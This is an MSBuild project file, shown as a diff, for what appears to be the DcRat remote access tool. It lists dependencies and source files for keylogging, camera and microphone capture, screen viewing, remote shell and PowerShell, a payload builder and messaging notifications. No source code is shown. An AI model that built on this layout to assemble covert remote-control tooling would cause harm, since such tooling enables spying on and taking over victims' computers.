@@ -1,0 +1,1056 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4E6526EE-E709-4C45-ADBF-7838E8D71A9B}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>DcRat</RootNamespace>
+    <AssemblyName>DcRat</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\Binaries\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\Binaries\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Resources\DcRatIcon.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Costura, Version=5.7.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Costura.Fody.5.7.0\lib\netstandard1.0\Costura.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib, Version=3.4.0.0, Culture=neutral, PublicKeyToken=50e96378b6e77999, processorArchitecture=MSIL">
+      <HintPath>..\packages\dnlib.3.4.0\lib\net45\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="FastColoredTextBox, Version=2.16.24.0, Culture=neutral, PublicKeyToken=fb8aa12b994ef61b, processorArchitecture=MSIL">
+      <HintPath>..\packages\FCTB.2.16.24\lib\FastColoredTextBox.dll</HintPath>
+      <EmbedInteropTypes>False</EmbedInteropTypes>
+    </Reference>
+    <Reference Include="IconExtractor, Version=1.0.1.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\IconExtractor.1.0.1\lib\net40\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="MaxMind.Db, Version=4.0.0.0, Culture=neutral, PublicKeyToken=66afa4cc5ae853ac, processorArchitecture=MSIL">
+      <HintPath>..\packages\MaxMind.Db.4.0.0\lib\netstandard2.0\MaxMind.Db.dll</HintPath>
+    </Reference>
+    <Reference Include="MaxMind.GeoIP2, Version=4.0.0.0, Culture=neutral, PublicKeyToken=66afa4cc5ae853ac, processorArchitecture=MSIL">
+      <HintPath>..\packages\MaxMind.GeoIP2.5.1.0\lib\netstandard2.0\MaxMind.GeoIP2.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Bcl.AsyncInterfaces, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Bcl.AsyncInterfaces.6.0.0\lib\net461\Microsoft.Bcl.AsyncInterfaces.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Extensions.DependencyInjection.Abstractions, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Extensions.DependencyInjection.Abstractions.6.0.0\lib\net461\Microsoft.Extensions.DependencyInjection.Abstractions.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Extensions.Options, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Extensions.Options.6.0.0\lib\net461\Microsoft.Extensions.Options.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Extensions.Primitives, Version=6.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Extensions.Primitives.6.0.0\lib\net461\Microsoft.Extensions.Primitives.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Microsoft.Win32.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Win32.Primitives.4.3.0\lib\net46\Microsoft.Win32.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="PeNet, Version=1.1.1.0, Culture=neutral, PublicKeyToken=6cf2bfba59bcfb3f, processorArchitecture=MSIL">
+      <HintPath>..\packages\PeNet.1.1.1\lib\net461\PeNet.dll</HintPath>
+    </Reference>
+    <Reference Include="PeNet.Asn1, Version=1.3.3.0, Culture=neutral, PublicKeyToken=1e2e3568f0050bf5, processorArchitecture=MSIL">
+      <HintPath>..\packages\PeNet.Asn1.1.3.3\lib\net461\PeNet.Asn1.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.AppContext, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.AppContext.4.3.0\lib\net463\System.AppContext.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ComponentModel.Composition" />
+    <Reference Include="System.ComponentModel.DataAnnotations" />
+    <Reference Include="System.Console, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Console.4.3.0\lib\net46\System.Console.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Diagnostics.DiagnosticSource, Version=4.0.1.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.DiagnosticSource.4.3.0\lib\net46\System.Diagnostics.DiagnosticSource.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Diagnostics.Tracing, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.Tracing.4.3.0\lib\net462\System.Diagnostics.Tracing.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Globalization.Calendars, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Globalization.Calendars.4.3.0\lib\net46\System.Globalization.Calendars.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.4.3.0\lib\net462\System.IO.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression, Version=4.1.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.4.3.0\lib\net46\System.IO.Compression.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.4.3.0\lib\net46\System.IO.FileSystem.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.Primitives.4.3.0\lib\net46\System.IO.FileSystem.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.4.3.0\lib\net463\System.Linq.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq.Expressions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.Expressions.4.3.0\lib\net463\System.Linq.Expressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Memory, Version=4.0.1.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Memory.4.5.4\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Net.Http, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Http.4.3.0\lib\net46\System.Net.Http.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Net.Sockets, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Sockets.4.3.0\lib\net46\System.Net.Sockets.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Reflection, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Reflection.4.3.0\lib\net462\System.Reflection.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.4.3.0\lib\net462\System.Runtime.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.6.0.0\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Extensions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.Extensions.4.3.0\lib\net462\System.Runtime.Extensions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.4.3.0\lib\net463\System.Runtime.InteropServices.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.RuntimeInformation.4.3.0\lib\net45\System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security" />
+    <Reference Include="System.Security.Cryptography.Algorithms, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Algorithms.4.3.0\lib\net463\System.Security.Cryptography.Algorithms.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Encoding, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Encoding.4.3.0\lib\net46\System.Security.Cryptography.Encoding.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Pkcs, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Pkcs.6.0.0\lib\net461\System.Security.Cryptography.Pkcs.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Primitives, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Primitives.4.3.0\lib\net46\System.Security.Cryptography.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.X509Certificates, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.X509Certificates.4.3.0\lib\net461\System.Security.Cryptography.X509Certificates.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Text.Encodings.Web, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Text.Encodings.Web.6.0.0\lib\net461\System.Text.Encodings.Web.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Text.Json, Version=6.0.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Text.Json.6.0.1\lib\net461\System.Text.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Text.RegularExpressions, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Text.RegularExpressions.4.3.0\lib\net463\System.Text.RegularExpressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Threading.Tasks.Extensions.4.5.4\lib\net461\System.Threading.Tasks.Extensions.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ValueTuple, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.ValueTuple.4.5.0\lib\net47\System.ValueTuple.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Xml.ReaderWriter, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Xml.ReaderWriter.4.3.0\lib\net46\System.Xml.ReaderWriter.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Vestris.ResourceLib, Version=2.2.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Vestris.ResourceLib.2.2.0-beta0004\lib\net45\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ChildForms\childFormAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChildForms\childFormAbout.Designer.cs">
+      <DependentUpon>childFormAbout.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ChildForms\childFormBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChildForms\childFormBuilder.Designer.cs">
+      <DependentUpon>childFormBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Controls\ByteConverter.cs" />
+    <Compile Include="Controls\HexEditor\ByteCollection.cs" />
+    <Compile Include="Controls\HexEditor\Caret.cs" />
+    <Compile Include="Controls\HexEditor\EditView.cs" />
+    <Compile Include="Controls\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\HexEditor\HexViewHandler.cs" />
+    <Compile Include="Controls\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="Controls\HexEditor\StringViewHandler.cs" />
+    <Compile Include="Controls\ListViewColumnSorter.cs" />
+    <Compile Include="Controls\Optimization.cs" />
+    <Compile Include="Controls\Regedit.cs" />
+    <Compile Include="Controls\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\RegistryValueLstItem.cs" />
+    <Compile Include="Controls\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\WordTextBox.designer.cs">
+      <DependentUpon>WordTextBox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FormInit.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormInit.Designer.cs">
+      <DependentUpon>FormInit.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HandlePacket\Packet.cs" />
+    <Compile Include="Helper\Helper.cs" />
+    <Compile Include="Helper\IconInjector.cs" />
+    <Compile Include="Helper\RegistryKeyExtensions.cs" />
+    <Compile Include="Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Helper\RegistrySeeker.cs" />
+    <Compile Include="Helper\StreamLibrary\Enums.cs" />
+    <Compile Include="Helper\StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="Helper\StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="Helper\StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="Helper\StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="Helper\StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="Helper\StreamLibrary\UnsafeCodecs\UnsafeOptimizedCodec.cs" />
+    <Compile Include="Helper\StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <Compile Include="Helper\WaveLib\Win32.cs" />
+    <Compile Include="Helper\WaveLib\WinSound.cs" />
+    <Compile Include="Helper\WaveLib\WinSoundPlayer.cs" />
+    <Compile Include="helpForms\helperFormMessage.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormMessage.Designer.cs">
+      <DependentUpon>helperFormMessage.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormCodeDom.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormCodeDom.Designer.cs">
+      <DependentUpon>helperFormCodeDom.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormCodeDom.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormCodeDom.Designer.cs">
+      <DependentUpon>singleFormCodeDom.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormDingTalk.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormDingTalk.Designer.cs">
+      <DependentUpon>helperFormDingTalk.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormDiscord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormDiscord.Designer.cs">
+      <DependentUpon>helperFormDiscord.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormMail.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormMail.Designer.cs">
+      <DependentUpon>helperFormMail.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditBinary.Designer.cs">
+      <DependentUpon>helperFormRegValueEditBinary.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditMultiString.Designer.cs">
+      <DependentUpon>helperFormRegValueEditMultiString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditString.Designer.cs">
+      <DependentUpon>helperFormRegValueEditString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormRegValueEditWord.Designer.cs">
+      <DependentUpon>helperFormRegValueEditWord.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormTask.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormTask.Designer.cs">
+      <DependentUpon>helperFormTask.cs</DependentUpon>
+    </Compile>
+    <Compile Include="helpForms\helperFormTelegram.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="helpForms\helperFormTelegram.Designer.cs">
+      <DependentUpon>helperFormTelegram.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MsgPack\BytesTools.cs" />
+    <Compile Include="MsgPack\MsgPack.cs" />
+    <Compile Include="MsgPack\MsgPackType.cs" />
+    <Compile Include="MsgPack\ReadTools.cs" />
+    <Compile Include="MsgPack\WriteTools.cs" />
+    <Compile Include="MsgPack\Zip.cs" />
+    <Compile Include="Setting.cs" />
+    <Compile Include="singleForms\singleFormKeyLogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormKeyLogger.Designer.cs">
+      <DependentUpon>singleFormKeyLogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormVoice.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormVoice.Designer.cs">
+      <DependentUpon>singleFormVoice.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormRegistry.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormRegistry.Designer.cs">
+      <DependentUpon>singleFormRegistry.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormDevice.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormDevice.Designer.cs">
+      <DependentUpon>singleFormDevice.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ChildForms\childFormHome.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChildForms\childFormHome.Designer.cs">
+      <DependentUpon>childFormHome.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormNetwork.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormNetwork.Designer.cs">
+      <DependentUpon>singleFormNetwork.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ChildForms\childFormSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChildForms\childFormSettings.Designer.cs">
+      <DependentUpon>childFormSettings.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ChildForms\childFormTasks.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChildForms\childFormTasks.Designer.cs">
+      <DependentUpon>childFormTasks.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Controls\ToggleButton.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Controls\ToggleButton.Designer.cs">
+      <DependentUpon>ToggleButton.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FormMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FormMain.Designer.cs">
+      <DependentUpon>FormMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="singleForms\singleFormCamera.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormCamera.Designer.cs">
+      <DependentUpon>singleFormCamera.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormCmd.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormCmd.Designer.cs">
+      <DependentUpon>singleFormCmd.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormFile.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormFile.Designer.cs">
+      <DependentUpon>singleFormFile.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormPowershell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormPowershell.Designer.cs">
+      <DependentUpon>singleFormPowershell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormProcess.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormProcess.Designer.cs">
+      <DependentUpon>singleFormProcess.cs</DependentUpon>
+    </Compile>
+    <Compile Include="singleForms\singleFormScreen.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="singleForms\singleFormScreen.Designer.cs">
+      <DependentUpon>singleFormScreen.cs</DependentUpon>
+    </Compile>
+    <Compile Include="TCPSocket\Clients.cs" />
+    <Compile Include="TCPSocket\Connection.cs" />
+    <EmbeddedResource Include="ChildForms\childFormAbout.resx">
+      <DependentUpon>childFormAbout.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormAbout.zh-CN.resx">
+      <DependentUpon>childFormAbout.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormBuilder.resx">
+      <DependentUpon>childFormBuilder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormBuilder.zh-CN.resx">
+      <DependentUpon>childFormBuilder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormHome.zh-CN.resx">
+      <DependentUpon>childFormHome.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormSettings.zh-CN.resx">
+      <DependentUpon>childFormSettings.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormTasks.zh-CN.resx">
+      <DependentUpon>childFormTasks.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FormInit.resx">
+      <DependentUpon>FormInit.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FormInit.zh-CN.resx">
+      <DependentUpon>FormInit.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FormMain.zh-CN.resx">
+      <DependentUpon>FormMain.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormCodeDom.zh-CN.resx">
+      <DependentUpon>helperFormCodeDom.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormDingTalk.zh-CN.resx">
+      <DependentUpon>helperFormDingTalk.cs</DependentUpon>
+    </EmbeddedResource>
